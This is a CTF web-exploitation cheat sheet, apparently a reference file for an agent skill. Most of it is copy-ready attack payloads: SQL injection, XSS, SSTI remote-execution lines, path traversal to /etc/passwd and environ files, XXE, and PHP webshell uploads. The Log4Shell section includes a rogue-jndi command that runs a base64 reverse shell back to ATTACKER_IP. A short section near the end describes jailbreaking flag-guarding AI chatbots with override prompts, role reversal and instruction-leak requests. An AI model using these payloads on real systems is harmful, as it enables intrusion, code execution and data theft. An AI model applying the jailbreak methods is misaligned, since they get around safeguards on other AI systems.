# CTF Web Field Notes

Long-form exploit notes that were moved out of `SKILL.md` so the main skill can stay focused on routing and first-pass execution.

## Table of Contents

- [Reconnaissance](#reconnaissance)
- [SQL Injection Quick Reference](#sql-injection-quick-reference)
- [XSS Quick Reference](#xss-quick-reference)
- [XSSI via JSONP Callback Exfiltration](#xssi-via-jsonp-callback-exfiltration)
- [Path Traversal / LFI Quick Reference](#path-traversal-lfi-quick-reference)
- [JWT Quick Reference](#jwt-quick-reference)
- [SSTI Quick Reference](#ssti-quick-reference)
- [Python str.format() Attribute Traversal](#python-strformat-attribute-traversal)
- [SSRF Quick Reference](#ssrf-quick-reference)
- [Command Injection Quick Reference](#command-injection-quick-reference)
- [XXE Quick Reference](#xxe-quick-reference)
- [PHP Type Juggling Quick Reference](#php-type-juggling-quick-reference)
- [PHP File Inclusion / LFI Quick Reference](#php-file-inclusion-lfi-quick-reference)
- [Code Injection Quick Reference](#code-injection-quick-reference)
- [Java Deserialization](#java-deserialization)
- [JNDI Injection and Log4Shell](#jndi-injection-and-log4shell)
- [Python Pickle Deserialization](#python-pickle-deserialization)
- [Race Conditions (Time-of-Check to Time-of-Use)](#race-conditions-time-of-check-to-time-of-use)
- [Node.js Quick Reference](#nodejs-quick-reference)
- [Auth & Access Control Quick Reference](#auth-access-control-quick-reference)
- [Apache CVE-2012-0053 HttpOnly Cookie Leak](#apache-cve-2012-0053-httponly-cookie-leak)
- [Apache mod_status Information Disclosure](#apache-mod_status-information-disclosure)
- [Open Redirect Chains](#open-redirect-chains)
- [Subdomain Takeover](#subdomain-takeover)
- [File Upload to RCE](#file-upload-to-rce)
- [Multi-Stage Chain Patterns](#multi-stage-chain-patterns)
- [Flask/Werkzeug Debug Mode](#flaskwerkzeug-debug-mode)
- [XXE with External DTD Filter Bypass](#xxe-with-external-dtd-filter-bypass)
- [JSFuck Decoding](#jsfuck-decoding)
- [DOM XSS via jQuery Hashchange](#dom-xss-via-jquery-hashchange)
- [Shadow DOM XSS](#shadow-dom-xss)
- [DOM Clobbering + MIME Mismatch](#dom-clobbering-mime-mismatch)
- [HTTP Request Smuggling via Cache Proxy](#http-request-smuggling-via-cache-proxy)
- [Path Traversal: URL-Encoded Slash Bypass](#path-traversal-url-encoded-slash-bypass)
- [WeasyPrint SSRF and File Read](#weasyprint-ssrf-and-file-read)
- [MongoDB Regex / $where Blind Injection](#mongodb-regex-where-blind-injection)
- [Pongo2 / Go Template Injection](#pongo2-go-template-injection)
- [ZIP Upload with PHP Webshell](#zip-upload-with-php-webshell)
- [basename() Bypass for Hidden Files](#basename-bypass-for-hidden-files)
- [Custom Linear MAC Forgery](#custom-linear-mac-forgery)
- [CSS/JS Paywall Bypass](#cssjs-paywall-bypass)
- [SSRF to Docker API RCE Chain](#ssrf-to-docker-api-rce-chain)
- [Castor XML Deserialization via xsi:type](#castor-xml-deserialization-via-xsitype)
- [Apache ErrorDocument Expression File Read](#apache-errordocument-expression-file-read)
- [HTTP TRACE Method Bypass](#http-trace-method-bypass)
- [LLM/AI Chatbot Jailbreak](#llmai-chatbot-jailbreak)
- [Admin Bot javascript: URL Scheme Bypass](#admin-bot-javascript-url-scheme-bypass)
- [XS-Leak via Image Load Timing + GraphQL CSRF](#xs-leak-via-image-load-timing-graphql-csrf)
- [React Server Components Flight Protocol RCE](#react-server-components-flight-protocol-rce)
- [Unicode Case Folding XSS Bypass](#unicode-case-folding-xss-bypass)
- [CSS Font Glyph + Container Query Data Exfiltration](#css-font-glyph-container-query-data-exfiltration)
- [Hyperscript / Alpine.js CDN CSP Bypass](#hyperscript-alpinejs-cdn-csp-bypass)
- [Solidity Transient Storage Clearing Collision (0.8.28-0.8.33)](#solidity-transient-storage-clearing-collision-0828-0833)
- [Chrome Unicode URL Normalization Bypass](#chrome-unicode-url-normalization-bypass)
- [CSP Nonce Bypass via base Tag Hijacking](#csp-nonce-bypass-via-base-tag-hijacking)
- [JA4/JA4H TLS Fingerprint Matching](#ja4ja4h-tls-fingerprint-matching)
- [Client-Side HMAC Bypass via Leaked JS Secret](#client-side-hmac-bypass-via-leaked-js-secret)
- [SQLi Keyword Fragmentation Bypass](#sqli-keyword-fragmentation-bypass)
- [Pickle Chaining via STOP Opcode Stripping](#pickle-chaining-via-stop-opcode-stripping)
- [XPath Blind Injection](#xpath-blind-injection)
- [SQLite File Path Traversal to Bypass String Equality](#sqlite-file-path-traversal-to-bypass-string-equality)
- [PHP Serialization Length Manipulation via Filter Word Expansion](#php-serialization-length-manipulation-via-filter-word-expansion)
- [CSP Bypass via link prefetch](#csp-bypass-via-link-prefetch)
- [XML Injection via X-Forwarded-For Header](#xml-injection-via-x-forwarded-for-header)
- [Base64 Decode Leniency and Parameter Override for Signature Bypass](#base64-decode-leniency-and-parameter-override-for-signature-bypass)
- [Common Flag Locations](#common-flag-locations)

## Reconnaissance

- View source for HTML comments, check JS/CSS files for internal APIs
- Look for `.map` source map files
- Check response headers for custom X- headers and auth hints
- Common paths: `/robots.txt`, `/sitemap.xml`, `/.well-known/`, `/admin`, `/api`, `/debug`, `/.git/`, `/.env`
- Search JS bundles: `grep -oE '"/api/[^"]+"'` for hidden endpoints
- Check for client-side validation that can be bypassed
- Compare what the UI sends vs. what the API accepts (read JS bundle for all fields)
- Check assets returning 404 status — `favicon.ico`, `robots.txt` may contain data despite error codes: `strings favicon.ico | grep -i flag`
- Tor hidden services: `feroxbuster -u 'http://target.onion/' -w wordlist.txt -proxy socks5h://127.0.0.1:9050 -t 10 -x.txt,.html,.bak`

## SQL Injection Quick Reference

**Detection:** Send `'` — syntax error indicates SQLi

```sql
' OR '1'='1                    # Classic auth bypass
' OR 1=1-                     # Comment termination
username=\&password= OR 1=1-  # Backslash escape quote bypass
' UNION SELECT sql,2,3 FROM sqlite_master-  # SQLite schema
0x6d656f77                     # Hex encoding for 'meow' (bypass quotes)
```

WAF bypasses: XML entity encoding (`&#x55;NION`), EXIF metadata injection (`exiftool -Comment="' UNION SELECT..."`), Shift-JIS `\u00a5`→`0x5c` backslash, QR code payload injection, double-keyword nesting (`selselectect`). See [sql-injection.md](sql-injection.md) for all techniques.

MySQL session variable dual-value injection: `@var:=` assigns return different values across sequential queries in one connection. PHP PCRE backtrack limit WAF bypass: 1M+ chars cause `preg_match()` to return `false`, passing `!false`. `information_schema.processlist` race condition leaks secrets from concurrent queries. See [sql-injection.md](sql-injection.md).

See [server-execution.md](server-execution.md) for adjacent execution pivots that chain off SQLi or parser bugs.

## XSS Quick Reference

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

Filter bypass: hex `\x3cscript\x3e`, entities `&#60;script&#62;`, case mixing `<ScRiPt>`, event handlers.
- **XSS dot-filter bypass:** Decimal IP (`1558071511` = `92.123.45.67`) eliminates dots from URLs. JavaScript bracket notation (`document["cookie"]`) replaces dot property access. See [browser-attacks.md](browser-attacks.md).
- **Cross-origin cookie XSS:** Set cookie with `domain=.parent.tld` from one subdomain to inject XSS payload rendered on a sibling subdomain. See [browser-attacks.md](browser-attacks.md).
- **AngularJS 1.x sandbox escape:** Override `String.prototype.charAt` with `trim` to bypass AngularJS expression sandbox, then `$eval` arbitrary JS. See [browser-attacks.md](browser-attacks.md).

See [browser-attacks.md](browser-attacks.md) for DOMPurify bypass, cache poisoning, CSPT, and React input tricks.

## XSSI via JSONP Callback Exfiltration

JSONP endpoint (`?callback=func`) wraps sensitive data in a function call. Load cross-origin via `<script src>` with custom callback to exfiltrate. Chain: SHA1 cookie inversion -> IDOR on debug endpoint -> XSSI -> cloud function OOB. See [browser-attacks.md](browser-attacks.md).

## Path Traversal / LFI Quick Reference

```text
../../../etc/passwd
....//....//....//etc/passwd     # Filter bypass
..%2f..%2f..%2fetc/passwd        # URL encoding
%252e%252e%252f                  # Double URL encoding
{.}{.}/flag.txt                  # Brace stripping bypass
```

**Windows 8.3 short filename bypass:** `FILEFO~1.EXT` short names bypass path filters that check the long filename. See [server-injection.md](server-injection.md).

**URL parse_url @ bypass:** `http://valid@attacker.com/` - PHP `parse_url()` extracts `attacker.com` as host, bypassing domain checks. See [server-injection.md](server-injection.md).
- **SSRF double-@ parse discrepancy:** `http://x:x@127.0.0.1:80@allowed.host/path` — `parse_url()` sees `allowed.host`, curl connects to `127.0.0.1`. Distinct from single-@ bypass. See [server-injection.md](server-injection.md).

**/dev/fd symlink bypass:** When `/proc` is blacklisted, use `/dev/fd/../environ` - `/dev/fd` symlinks to `/proc/self/fd`, so `../` reaches `/proc/self/`. See [server-injection.md](server-injection.md).

**Python footgun:** `os.path.join('/app/public', '/etc/passwd')` returns `/etc/passwd`

## JWT Quick Reference

1. `alg: none` — remove signature entirely
2. Algorithm confusion (RS256→HS256) — sign with public key
3. Weak secret — brute force with hashcat/flask-unsign
4. Key exposure — check `/api/getPublicKey`, `.env`, `/debug/config`
5. Balance replay — save JWT, spend, replay old JWT, return items for profit
6. Unverified signature — modify payload, keep original signature
7. JWK header injection — embed attacker public key in token header
8. JKU header injection — point to attacker-controlled JWKS URL
9. KID path traversal — `../../../dev/null` for empty key, or SQL injection in KID

See [auth-access-control.md](auth-access-control.md) for full JWT/JWE attacks and session manipulation.

## SSTI Quick Reference

**Detection:** `{{7*7}}` returns `49`

```python
# Jinja2 RCE
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
# Go template
{{.ReadFile "/flag.txt"}}
# EJS
<%- global.process.mainModule.require('child_process').execSync('id') %>
# Jinja2 quote bypass (keyword args):
{{obj.__dict__.update(attr=value) or obj.name}}
```

**Mako SSTI (Python):** `${__import__('os').popen('id').read()}` — no sandbox, plain Python inside `${}` or `<% %>`. **Twig SSTI (PHP):** `{{['id']|map('system')|join}}` — distinguish from Jinja2 via `{{7*'7'}}` (Twig repeats string, Jinja2 returns 49). See [server-injection.md](server-injection.md).

**Quote filter bypass:** Use `__dict__.update(key=value)` — keyword arguments need no quotes. See [server-injection.md](server-injection.md).

**ERB SSTI (Ruby/Sinatra):** `<%= Sequel::DATABASES.first[:table].all %>` bypasses ERBSandbox variable-name restrictions via the global `Sequel::DATABASES` array. See [server-injection.md](server-injection.md).

## Python str.format() Attribute Traversal

Python `str.format()` allows dot-notation attribute traversal (`{0.attr.subattr}`) and bracket indexing (`{0[key]}`). When user input reaches `.format(obj)`, leak arbitrary attributes without a template engine. Distinct from SSTI. See [server-injection.md](server-injection.md).

**Thymeleaf SpEL SSTI (Java/Spring):** `${T(org.springframework.util.FileCopyUtils).copyToByteArray(new java.io.File("/flag.txt"))}` reads files via Spring utility classes when standard I/O is WAF-blocked. Works in distroless containers (no shell). See [server-execution.md](server-execution.md).

## SSRF Quick Reference

```text
127.0.0.1, localhost, 127.1, 0.0.0.0, [::1]
127.0.0.1.nip.io, 2130706433, 0x7f000001
```

DNS rebinding for TOCTOU: https://lock.cmpxchg8b.com/rebinder.html

**Host header SSRF:** Server builds internal request URL from `Host` header (e.g., `http.Get("http://" + request.Host + "/validate")`). Set Host to attacker domain → validation request goes to attacker server. See [server-injection.md](server-injection.md).

**ElasticSearch Groovy RCE via SSRF:** SSRF to internal ES on port 9200 enables RCE through `script_fields` Groovy scripting (pre-5.0). See [server-execution.md](server-execution.md).

## Command Injection Quick Reference

```bash; id          | id          `id`          $(id)
%0aid         # Newline     127.0.0.1%0acat /flag
```

When cat/head blocked: `sed -n p flag.txt`, `awk '{print}'`, `tac flag.txt`

**Bash brace expansion (space-free injection):** `{ls,-la,..}` expands to `ls -la..` without literal spaces. See [server-execution.md](server-execution.md).

**Git CLI newline injection:** `%0a` in URL path breaks out of backtick/system() shell calls that only filter `;|&<>`. See [server-execution.md](server-execution.md).

## XXE Quick Reference

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

PHP filter: `<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">`

**XXE in DOCX uploads:** DOCX is ZIP+XML; inject XXE in `[Content_Types].xml` inside the archive. See [server-injection.md](server-injection.md).

## PHP Type Juggling Quick Reference

Loose `==` performs type coercion: `0 == "string"` is `true`, `"0e123" == "0e456"` is `true` (magic hashes). Send JSON integer `0` to bypass string password checks. `strcmp([], "str")` returns `NULL` which passes `!strcmp()`. Use `===` for defense.

See [server-injection.md](server-injection.md) for comparison table and exploit payloads.

## PHP File Inclusion / LFI Quick Reference

`php://filter/convert.base64-encode/resource=config` leaks PHP source code without execution. Common LFI targets: `/etc/passwd`, `/proc/self/environ`, app config files. Null byte (`%00`) truncates `.php` suffix on PHP < 5.3.4.

See [server-injection.md](server-injection.md) for filter chains and adjacent pivot techniques.

## Code Injection Quick Reference

**Ruby `instance_eval`:** Break string + comment: `VALID');INJECTED_CODE#`
**Perl `open()`:** 2-arg open allows pipe: `|command|`
**JS `eval` blocklist bypass:** rebuild `constructor.constructor` through concatenated property names, then call it as a function factory.
**PHP deserialization:** Craft serialized object in cookie → LFI/RCE
**LaTeX injection:** `\input{|"cat /flag.txt"}` — shell command via pipe syntax in PDF generation services. `\@@input"/etc/passwd"` for file reads without shell.
- **LaTeX restricted write18 bypass:** When `write18` is restricted, `mpost -ini "-tex=bash -c (cmd)" file.mp` uses mpost's whitelisted status to execute arbitrary commands. `${IFS}` replaces spaces. See [server-execution.md](server-execution.md).

**PHP backtick eval (character limit):** `` echo`cat *`; `` - PHP backticks = `shell_exec()`, fits RCE in as few as 8 chars. Use `` `$_GET[0]`; `` to move payload to URL parameter. See [server-execution.md](server-execution.md).
**PHP assert() injection:** `assert("strpos('$input', '..') === false")` — inject `') || system('cmd');//` for RCE (PHP < 7.2). See [server-execution.md](server-execution.md).
**Common Lisp `read` injection:** `#.(run-shell-command "cat /flag")` — reader macro evaluates at parse time. See [server-execution.md](server-execution.md).
**Ruby ObjectSpace scanning:** `ObjectSpace.each_object(String)` dumps all in-memory strings including flag. See [server-execution.md](server-execution.md).

See [server-execution.md](server-execution.md) for full payloads and bypass techniques.

## Java Deserialization

Serialized Java objects (`rO0AB` / `aced0005`) + ysoserial gadget chains → RCE via `ObjectInputStream.readObject()`. Try `CommonsCollections1-7`, `URLDNS` for blind detection. See [server-execution.md](server-execution.md).

## JNDI Injection and Log4Shell

Any sink calling `InitialContext.lookup(attacker_input)` enables JNDI injection. Most famous: **Log4Shell (CVE-2021-44228)** — Log4j 2.x evaluates `${jndi:ldap://attacker/path}` in logged strings.

**Common JNDI sinks** (beyond Log4j): Spring `lookup()`, Shiro JndiTemplate, any `env.lookup()` on user input, LDAP/RMI/DNS configured names.

**Attack flow:**
1. Attacker injects `${jndi:ldap://ATTACKER:1389/o=tomcat}` into any logged/evaluated field
2. Target's JNDI client connects to attacker LDAP server
3. LDAP response delivers execution payload

**Two LDAP response types — critical distinction:**

| LDAP Attribute | Behavior | When it works |
|----------------|----------|---------------|
| `javaSerializedData` | Target calls `ObjectInputStream.readObject()` | Requires gadget chain in classpath (CC, Spring, etc.) |
| `javaReferenceAddress` + `javaFactory` | Target calls `NamingManager.getObjectInstance()` → factory class | Requires factory class on local classpath |

**BeanFactory/ELProcessor bypass** (works when `trustURLCodebase=false`, JDK 8u191+):
- Requires Tomcat on classpath (embedded or standalone)
- LDAP response specifies `javaFactory: org.apache.naming.factory.BeanFactory`
- `javaClassName: javax.el.ELProcessor`
- `javaReferenceAddress` entries set `forceString` to route method calls → `ELProcessor.eval()` → arbitrary Java execution

**Tool: rogue-jndi** (`github.com/veracode-research/rogue-jndi`):
```bash
# Build
git clone https://github.com/veracode-research/rogue-jndi && cd rogue-jndi && mvn package -q

# Run (o=tomcat = BeanFactory/ELProcessor route)
java -jar target/RogueJndi-1.1.jar \
    --command "bash -c {echo,BASE64_REVSHELL}|{base64,-d}|{bash,-i}" \
    --hostname ATTACKER_IP -p 8888
```

**Command encoding for EL expressions:** Shell metacharacters break EL parsing. Use brace expansion: `bash -c {echo,BASE64}|{base64,-d}|{bash,-i}` avoids spaces/redirects/pipes in the EL string.

**Trigger points:** HTTP headers, cookies, form fields, user-agent, X-Forwarded-For, URL paths — anything the app logs via Log4j. UniFi Network Application logs the `remember` field in login POST requests.

**Triage:**
1. Confirm callback: inject `${jndi:ldap://ATTACKER:1389/test}` → check for LDAP connection
2. If callback received: run rogue-jndi with `o=tomcat` for BeanFactory bypass
3. If no callback: try `${jndi:dns://ATTACKER/test}` (simpler, fewer blockers)
4. If BeanFactory fails: try Groovy route (`o=groovy`) or remote reference (`o=reference`) on older JDK

## Python Pickle Deserialization

`pickle.loads()` calls `__reduce__()` → `(os.system, ('cmd',))` instant RCE. Also via `yaml.load()`, `torch.load()`, `joblib.load()`. See [server-execution.md](server-execution.md).

## Race Conditions (Time-of-Check to Time-of-Use)

Concurrent requests bypass check-then-act patterns (balance, coupons, registration). Send 50 simultaneous requests — all see pre-modification state. See [server-execution.md](server-execution.md).

## Node.js Quick Reference

**Prototype pollution:** `{"__proto__": {"isAdmin": true}}` or flatnest circular ref bypass
**VM escape:** `this.constructor.constructor("return process")()` → RCE
**Full chain:** pollution → enable JS eval in Happy-DOM → VM escape → RCE

**Prototype pollution permission bypass:** `{"__proto__":{"isAdmin":true}}` on JSON endpoints pollutes `Object.prototype`. Always try `__proto__` injection even when the vulnerability seems like something else.

See [browser-attacks.md](browser-attacks.md) for detailed prototype-pollution exploitation.

## Auth & Access Control Quick Reference

- Cookie manipulation: `role=admin`, `isAdmin=true`
- Public admin-login cookie seeding: check if `/admin/login` sets reusable admin session cookie
- Host header bypass: `Host: 127.0.0.1`
- Hidden endpoints: search JS bundles for `/api/internal/`, `/api/admin/`; fuzz with auth cookie for non-`/api` routes like `/internal/*`
- Client-side gates: `window.overrideAccess = true` or call API directly
- Password inference: profile data + structured ID format → brute-force
- Weak signature: check if only first N chars of hash are validated
- Affine cipher OTP: only 312 possible values (`12 mults × 26 adds`), brute-force all in seconds
- TOTP srand(time()) weakness: sync server clock to predict codes. See [auth-access-control.md](auth-access-control.md)
- Express.js `%2F` middleware bypass, IDOR on WIP endpoints, git history credential leakage
- CI/CD variable theft, identity provider API takeover (bypass MFA: `not_configured_action: skip`)
- SAML SSO automation, Guacamole parameter extraction, login page poisoning, TeamCity REST API RCE

## Apache CVE-2012-0053 HttpOnly Cookie Leak

Send oversized `Cookie` header to trigger 400 Bad Request; Apache's error page reflects the cookie value, leaking HttpOnly cookies. See [web-vulnerabilities-and-cves.md](web-vulnerabilities-and-cves.md).

## Apache mod_status Information Disclosure

`/server-status` endpoint reveals active URLs, client IPs, and session data. Use for admin endpoint discovery and session forging. See [auth-access-control.md](auth-access-control.md).

## Open Redirect Chains

Chain open redirects (`?redirect=`, `?next=`, `?url=`) with OAuth flows for token theft. Bypass validation with `@`, `%00`, `//`, `\`, CRLF. See [auth-access-control.md](auth-access-control.md).

## Subdomain Takeover

Dangling CNAME → claim resource on external service (GitHub Pages, S3, Heroku). Use `subfinder` + `httpx` to enumerate, check fingerprints. See [auth-access-control.md](auth-access-control.md).

See [auth-access-control.md](auth-access-control.md) for access control bypasses, JWT/JWE attacks, and OAuth/SAML/CI-CD/infrastructure auth.

## File Upload to RCE

- `.htaccess` upload: `AddType application/x-httpd-php.lol` + webshell
- Gogs symlink: overwrite `.git/config` with `core.sshCommand` RCE
- Python `.so` hijack: write malicious shared object + delete `.pyc` to force reimport
- ZipSlip: symlink in zip for file read, path traversal for file write
- Log poisoning: PHP payload in User-Agent + path traversal to include log
- PNG/PHP polyglot + double extension: valid PNG with `<?php` after IEND chunk, uploaded as `.png.php`; when `disable_functions` blocks exec, use `scandir('/')` + `file_get_contents()` for flag. See [server-execution.md](server-execution.md).

See [server-execution.md](server-execution.md) for detailed steps.

## Multi-Stage Chain Patterns

**0xClinic chain:** Password inference → path traversal + ReDoS oracle (leak secrets from `/proc/1/environ`) → CRLF injection (CSP bypass + cache poisoning + XSS) → urllib scheme bypass (SSRF) → `.so` write via path traversal → RCE

**Key chaining insights:**
- Path traversal + any file-reading primitive → leak `/proc/*/environ`, `/proc/*/cmdline`
- CRLF in headers → CSP bypass + cache poisoning + XSS in one shot
- Arbitrary file write in Python → `.so` hijacking or `.pyc` overwrite for RCE
- Lowercased response body → use hex escapes (`\x3c` for `<`)

## Flask/Werkzeug Debug Mode

Weak session secret brute-force + forge admin session + Werkzeug debugger PIN RCE. See [server-execution.md](server-execution.md) for the full attack chain.

## XXE with External DTD Filter Bypass

Host malicious DTD externally to bypass upload keyword filters. See [server-injection.md](server-injection.md) for payload direction and OOB patterning.

## JSFuck Decoding

Remove trailing `()()`, eval in Node.js, `.toString()` reveals original code. See [browser-attacks.md](browser-attacks.md).

## DOM XSS via jQuery Hashchange

`$(location.hash)` + `hashchange` event → XSS via iframe: `<iframe src="https://target/#" onload="this.src+='<img src=x onerror=print()>'">`. See [browser-attacks.md](browser-attacks.md).

## Shadow DOM XSS

Proxy `attachShadow` to capture closed roots; `(0,eval)` for scope escape; `</script>` injection. See [browser-attacks.md](browser-attacks.md).

## DOM Clobbering + MIME Mismatch

`.jpg` served as `text/html`; `<form id="config">` clobbers JS globals. See [browser-attacks.md](browser-attacks.md).

## HTTP Request Smuggling via Cache Proxy

Cache proxy desync for cookie theft via incomplete POST body. See [browser-attacks.md](browser-attacks.md).

## Path Traversal: URL-Encoded Slash Bypass

`%2f` bypasses nginx route matching but filesystem resolves it. See [server-injection.md](server-injection.md).

## WeasyPrint SSRF and File Read

`<a rel="attachment" href="file:///flag.txt">` or `<link rel="attachment" href="http://127.0.0.1/admin">` - WeasyPrint embeds fetched content as PDF attachments, bypassing header checks. Boolean oracle via `/Type /EmbeddedFile` presence. See [server-execution.md](server-execution.md) and [web-vulnerabilities-and-cves.md](web-vulnerabilities-and-cves.md).

## MongoDB Regex / $where Blind Injection

Break out of `/.../i` with `a^/)||(<condition>)&&(/a^`. Binary search `charCodeAt()` for extraction. See [server-injection.md](server-injection.md).

## Pongo2 / Go Template Injection

`{% include "/flag.txt" %}` in uploaded file + path traversal in template parameter. See [server-execution.md](server-execution.md).

## ZIP Upload with PHP Webshell

Upload ZIP containing `.php` file → extract to web-accessible dir → `file_get_contents('/flag.txt')`. See [server-execution.md](server-execution.md).

## basename() Bypass for Hidden Files

`basename()` only strips dirs, doesn't filter `.lock` or hidden files in same directory. See [server-injection.md](server-injection.md).

## Custom Linear MAC Forgery

Linear XOR-based signing with secret blocks → recover from known pairs → forge for target. See [auth-access-control.md](auth-access-control.md).

## CSS/JS Paywall Bypass

Content behind CSS overlay (`position: fixed; z-index: 99999`) is still in the raw HTML. `curl` or view-source bypasses it instantly. See [browser-attacks.md](browser-attacks.md).

## SSRF to Docker API RCE Chain

SSRF to unauthenticated Docker daemon on port 2375. Use `/archive` for file extraction, `/exec` + `/exec/{id}/start` for command execution. Chain through internal POST relay when SSRF is GET-only. See [server-execution.md](server-execution.md).

## Castor XML Deserialization via xsi:type

Castor XML `Unmarshaller` without mapping file trusts `xsi:type` attributes for arbitrary Java class instantiation. Chain through JNDI (Java Naming and Directory Interface) / RMI (Remote Method Invocation) via ysoserial `CommonsBeanutils1` for RCE. Requires Java 11 (not 17+). Check `pom.xml` for `castor-xml`. See [server-execution.md](server-execution.md).

## Apache ErrorDocument Expression File Read

`.htaccess` with `ErrorDocument 404 "%{file:/etc/passwd}"` reads files at Apache level, bypassing `php_admin_flag engine off`. Requires `AllowOverride FileInfo`. Upload via SFTP, trigger with 404 request. See [server-execution.md](server-execution.md).

## HTTP TRACE Method Bypass

Endpoints returning 403 on GET/POST may respond to TRACE, PUT, PATCH, or DELETE. Test with `curl -X TRACE`. See [auth-access-control.md](auth-access-control.md).

## LLM/AI Chatbot Jailbreak

AI chatbots guarding flags can be bypassed with system override prompts, role-reversal, or instruction leak requests. Rotate session IDs and escalate prompt severity. See [auth-access-control.md](auth-access-control.md).

## Admin Bot javascript: URL Scheme Bypass

`new URL()` validates syntax only, not protocol — `javascript:` URLs pass and execute in Puppeteer's authenticated context. CSP/SRI on the target page are irrelevant since JS runs in navigation context. See [browser-attacks.md](browser-attacks.md).

## XS-Leak via Image Load Timing + GraphQL CSRF

HTML injection → meta refresh redirect (CSP bypass) → admin bot loads attacker page → JavaScript makes cross-origin GET requests to `localhost` GraphQL endpoint via `new Image().src` → measures time-based SQLi (`SLEEP(1)`) through image error timing → character-by-character flag exfiltration. GraphQL GET requests bypass CORS preflight. See [browser-attacks.md](browser-attacks.md).

## React Server Components Flight Protocol RCE

Identify via `Next-Action`, `Accept: text/x-component`, Flight payloads, App Router routes, or server-action responses. CVE-2025-55182 belongs in the React Server Components / Flight deserialization lane: confirm stack and version signals first, then use the smallest harmless proof available, such as a controlled redirect/error header, callback, or container-local echo. See [server-execution.md](server-execution.md) and [web-vulnerabilities-and-cves.md](web-vulnerabilities-and-cves.md#modern-framework-pivots).

## Unicode Case Folding XSS Bypass

**Pattern:** Sanitizer regex uses ASCII-only matching (`<\s*script`), but downstream processing applies Unicode case folding (`strings.EqualFold`). `<ſcript>` (U+017F Latin Long S) bypasses regex but folds to `<script>`. Other pairs: `ı`→`i`, `K` (U+212A)→`k`. See [browser-attacks.md](browser-attacks.md).

## CSS Font Glyph + Container Query Data Exfiltration

**Pattern:** Exfiltrate inline text via CSS injection (no JS). Custom font assigns unique glyph widths per character. Container queries match width ranges to fire background-image requests - one request per character. Works under strict CSP. See [browser-attacks.md](browser-attacks.md).

## Hyperscript / Alpine.js CDN CSP Bypass

**Pattern:** CSP allows `cdnjs.cloudflare.com`. Load Hyperscript (`_=` attributes) or Alpine.js (`x-data`, `x-init`) from CDN - they execute code from HTML attributes that sanitizers don't strip. See [browser-attacks.md](browser-attacks.md).

## Solidity Transient Storage Clearing Collision (0.8.28-0.8.33)

**Pattern:** Solidity IR pipeline (`-via-ir`) generates identically-named Yul helpers for `delete` on persistent and transient variables of the same type. One uses `sstore`, the other should use `tstore`, but deduplication picks only one. Exploits: overwrite `owner` (slot 0) via transient `delete`, or make persistent `delete` (revoke approvals) ineffective. Workaround: use `_lock = address(0)` instead of `delete _lock`. See [web3-attacks.md](web3-attacks.md).

## Chrome Unicode URL Normalization Bypass

Chrome's IDNA/punycode normalization converts fullwidth Unicode characters (U+FF00-U+FF5E) to ASCII equivalents, bypassing length checks and character filters on domain names. See [browser-attacks.md](browser-attacks.md).

## CSP Nonce Bypass via base Tag Hijacking

**Pattern:** CSP uses `script-src 'nonce-xxx'` but missing `base-uri` directive. Inject `<base href="https://attacker.com/">` before a nonced `<script src="relative.js">` - script loads from attacker server but satisfies CSP via the valid nonce. Defense: always include `base-uri 'self'`. See [browser-attacks.md](browser-attacks.md).

## JA4/JA4H TLS Fingerprint Matching

**Pattern:** Server validates browser identity via JA4 (TLS ClientHello fingerprint) and JA4H (HTTP header ordering fingerprint) in addition to User-Agent. Spoofing UA alone fails; must match the target browser's TLS cipher suite order and HTTP header sequence. For legacy browsers, run the actual browser. See [auth-access-control.md](auth-access-control.md).

## Client-Side HMAC Bypass via Leaked JS Secret

Deobfuscate client-side JS to extract hardcoded HMAC secret, then forge signatures for arbitrary requests via browser console. See [browser-attacks.md](browser-attacks.md).

## SQLi Keyword Fragmentation Bypass

Single-pass `preg_replace()` keyword filters bypassed by nesting the stripped keyword inside the payload: `unload_fileon` → `union` after `load_file` removal. See [server-execution.md](server-execution.md).

## Pickle Chaining via STOP Opcode Stripping

Strip pickle STOP opcode (`\x2e`) from first payload, concatenate second — both `__reduce__` calls execute in single `pickle.loads()`. Chain `os.dup2()` for socket output. See [server-execution.md](server-execution.md).

## XPath Blind Injection

`substring(normalize-space(../../../node()),1,1)='a'` — boolean-based blind extraction from XML data stores via response length oracle. See [server-injection.md](server-injection.md).

## SQLite File Path Traversal to Bypass String Equality

Input `/../gamesim_GM` fails `== "GM"` string check but filesystem normalizes `/var/game_db/gamesim_/../gamesim_GM.db` to the blocked path. See [server-injection.md](server-injection.md).

## PHP Serialization Length Manipulation via Filter Word Expansion

Post-serialization string filter replaces "where" (5 chars) with "hacker" (6 chars). Repeat "where" N times so expansion overflows by exactly enough bytes to inject a serialized field (`";}s:5:"photo";s:10:"config.php";}`). See [server-execution.md](server-execution.md).

## CSP Bypass via link prefetch

`<link rel="prefetch" href="http://attacker.com/steal">` not blocked by CSP `script-src`. Also: `<meta http-equiv="refresh">`. Scriptless data exfiltration. See [browser-attacks.md](browser-attacks.md).

## XML Injection via X-Forwarded-For Header

Server builds XML from headers without escaping. Inject `</ip><admin>true</admin><ip>` via X-Forwarded-For; first-tag-wins XML parsing. See [server-injection.md](server-injection.md).

## Base64 Decode Leniency and Parameter Override for Signature Bypass

`b64decode()` silently ignores non-base64 chars. Append `&price=0` after signature - b64decode strips it, but parameter parser processes it (last value wins). See [auth-access-control.md](auth-access-control.md).

## Common Flag Locations

Files: `/flag.txt`, `/flag`, `/app/flag.txt`, `/home/*/flag*`. Env: `/proc/self/environ`. DB: `flag`, `flags`, `secret` tables. Headers: `x-flag`, `x-archive-tag`, `x-proof`. DOM: `display:none` elements, `data-*` attributes.
